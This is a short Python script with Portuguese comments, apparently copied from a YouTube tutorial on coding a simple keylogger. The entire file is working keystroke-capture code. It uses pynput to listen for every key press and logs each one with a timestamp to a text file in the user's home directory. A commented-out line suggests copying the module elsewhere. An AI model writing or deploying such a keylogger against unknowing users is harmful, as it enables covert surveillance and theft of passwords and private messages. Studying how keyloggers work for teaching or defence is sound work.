

"""
Fonte:
    https://www.youtube.com/watch?v=ePqNDPLkwp0

Canal:
    NeuralNine

Título:
    Coding A Simple Keylogger in Python
"""

from logging import basicConfig, DEBUG, info
from pynput.keyboard import Listener
from os import getlogin

# Alternativo
# from shutil import copyfile
# copyfile('nome do módulo.py', 'caminho para onde o módulo será copiado')

user = getlogin()  # retornar o nome de usuário logado no OS no momento
login_dir = f'/home/{user}'
basicConfig(
    filename=f"{login_dir}/my_log.txt",
    level=DEBUG,
    format="%(asctime)s: %(message)s"
)

def key_handler(key) -> None:
    info(key)

with Listener(on_press=key_handler) as listener:
    listener.join()
